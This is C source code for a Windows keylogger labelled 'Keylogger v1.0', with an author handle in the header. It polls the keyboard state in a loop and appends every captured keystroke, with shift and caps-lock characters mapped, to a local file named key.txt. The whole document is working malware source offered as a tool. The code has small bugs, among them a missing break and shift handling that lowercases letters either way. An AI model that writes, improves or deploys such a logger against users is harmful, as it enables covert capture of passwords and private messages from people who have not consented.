/*
Keylogger v1.0
Author :- ABHI (5her10c)*/

#include<stdio.h>
#include<stdlib.h>
#include<windows.h>


int main() {
    int key,isPressed,last_key_state[0xFF];
    char showKey;
    int isCAPSLOCK,isNUMLOCK,isL_SHIFT,isR_SHIFT;
    char NUMCHAR[]=")!@#$%^&*(";
    char chars_vn[]=";=,-./`";
    char chars_vs[]=":+<_>?~";
    char chars_va[]="[\\]\';";
    char chars_vb[]="{|}\"";
    
    FILE *fp;
    char KEY_LOG_FILE[]="key.txt";
    
    for (key = 0;key <0xFF;key++) {
        last_key_state[key] =0;
    }

    while(1){
        Sleep(10);
        isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
        isNUMLOCK=(GetKeyState(0x90)&0xFF)>0?1:0;
        isL_SHIFT=(GetAsyncKeyState(0xA0)&0xFF00)>0?1:0;
        isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;
     
        for ( key=0; key<0xFF;key++)
        {
            isPressed = GetKeyState(key)&0xFF00>0?1:0;
            int isPre = GetAsyncKeyState(key);
            showKey=(char)key;
            if(isPressed==1 && last_key_state[key]==0 || isPre==-32767){

                //backspace and cntrl
                 switch(key)
                {
                    case VK_BACK:
                        printf("[BACKSPACE]");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("[BACKSPACE]",fp);
                        fclose(fp);
                    break;
                    case VK_CONTROL:
                        printf("^");
                        fp=fopen(KEY_LOG_FILE,"a");
                        fputs("^",fp);
                        fclose(fp);
                default:
                    break;
                }
                //alphabets
                if(key>=0x41 && key<=0x5A ){
                    if(isCAPSLOCK==0){
                        if(isL_SHIFT==0 && isR_SHIFT==0){
                            showKey=(char)(key+0x20);
                        }
                        else if(isL_SHIFT==1 || isR_SHIFT==1){
                            showKey=(char)(key+0x20);
                        }
                    }
                //for num chars
                }else if(key>=0x30 && key<=0x39 ){
                    if(isL_SHIFT==1 || isR_SHIFT==1){
                        showKey=NUMCHAR[key-0x30];
                       
                    }
                //for right-side numpad
                }else if(key>=0x60 && key<=0x69 && isNUMLOCK==1){
                    showKey=(char)(key-0x30);
                
                }
                //printable chars
                else if(key>=0xBA && key<=0xC0){
                    if(isL_SHIFT==1 || isR_SHIFT==1){
                        showKey=chars_vs[key-0xBA];
                        
                    }else{
                        showKey=chars_vn[key-0xBA];
                    }
                }
                else if(key>=0xDB && key<=0xDF){
                    if(isL_SHIFT==1 || isR_SHIFT==1){
                        showKey=chars_vb[key-0xDB];
                        
                    }else{
                        showKey=chars_va[key-0xDB];
                    }
                }
                
                //enter key
                else if(key==0x0D){
                    showKey=(char)0x0A;
                }else if(key>=0x6A && key<=0x6F){
                    showKey=(char)(key-0x40);
                }
                else if(key!=0x20 && key!=0x09){
                   
                    showKey=(char)0x00;
                }
                
                if(showKey!=(char)0x00){
                    printf("%c",showKey);
                    fp=fopen(KEY_LOG_FILE,"a");
                    putc(showKey,fp);
                    fclose(fp);
                }
            }
            
            last_key_state[key] = isPressed;
        }
        
        
    }
}